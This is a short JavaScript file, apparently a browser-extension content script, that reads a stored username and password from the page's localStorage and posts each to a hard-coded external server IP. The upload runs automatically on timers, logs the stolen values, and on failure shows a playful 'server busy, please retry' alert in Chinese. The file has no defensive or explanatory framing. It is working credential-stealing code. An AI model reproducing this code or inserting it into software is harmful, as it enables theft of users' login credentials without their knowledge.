console.log("########sendkey_content#######");
function sendmessage(){
    var username = localStorage.getItem('username');
	var password = localStorage.getItem('password');
	if(username||password == null){

	}
    var url = "http://49.232.13.120:1111/sendusername"
    var request = new XMLHttpRequest();
    try{
        request.open("POST",url);
		request.send(username);
		console.log("sending " + username);	
	}
    catch(e){
        alert("哼唧 = =# 服务器繁忙请重试的啦！");
    }
    request.onload = function() {
        if(request.status == 200) {
            console.log(request.responseText);
        }else{
			console.log("server is 404")
		}
	}

	var url = "http://49.232.13.120:1111/sendpassword"
    var request = new XMLHttpRequest();
    try{
        request.open("POST",url);
		request.send(password);
		console.log("sending " + password);	
    }
    catch(e){
        alert("哼唧 = =# 服务器繁忙请重试的啦！");
    }
    request.onload = function() {
        if(request.status == 200) {
            console.log(request.responseText);
        }
    }
}

for(var i = 0;i<3;i++){
	setTimeout(sendmessage,1000);
}



